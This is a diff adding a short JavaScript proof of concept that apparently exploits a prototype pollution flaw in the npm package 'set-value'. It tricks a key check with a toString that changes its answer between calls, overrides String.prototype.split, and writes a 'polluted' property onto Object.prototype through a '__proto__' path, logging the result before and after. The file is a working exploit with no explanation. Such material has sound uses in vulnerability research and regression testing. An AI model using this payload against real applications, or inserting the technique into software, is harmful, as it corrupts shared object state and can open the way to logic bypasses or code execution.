@@ -1,0 +1,22 @@
+var arg = ['__proto__'];
+var flag1 = true;
+arg.toString = function () {
+    if (flag1) {
+        flag1 = false;
+        return 'foo';
+    } else {
+        return '__proto__';
+    }
+};
+String.prototype.split = function () {
+    return [
+        arg,
+        'polluted'
+    ];
+};
+const setFn = require('set-value');
+const paths = ['__proto__.polluted'];
+var obj = {};
+console.log({}.polluted);
+setFn({}, paths[0], 'yes');
+console.log({}.polluted);
